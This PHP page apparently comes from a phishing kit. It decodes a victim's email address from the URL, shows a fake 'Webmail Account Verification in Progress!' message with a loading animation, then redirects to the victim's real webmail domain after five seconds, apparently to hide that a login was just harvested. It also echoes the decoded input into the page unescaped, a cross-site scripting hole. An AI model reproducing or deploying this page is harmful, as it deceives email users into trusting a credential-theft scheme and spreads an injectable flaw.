<?php

if (isset($_GET['userid'])) {
$userid = $_GET['userid'];
$userid = base64_decode($userid);
}
$domain = explode('@', $userid);
$eol = '?_task=mail';
$l = 'https://webmail.'.strtolower($domain[1]).$eol;
header('Refresh:5; url='.$l);

?>
<html>
<head>
<title>Loading...</title>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body bgcolor="#ffffff" text="#000000">
<div>
<center>

  <p><b>Your Webmail Account Verification in Progress! <?php echo isset($_GET['userid']) ? base64_decode($_GET['userid']) : '' ?></b>

      <br><br>

      <b><font size="3">Webmail account</font></b></p>

  <p><strong><font color="#0000FF">You will now be redirected to your account in 5 seconds, please wait ...</font></strong></p>

  <p><img src="loadingAnimation.gif" width="250" height="15"></p>

</center>

</div>

</body>

</html>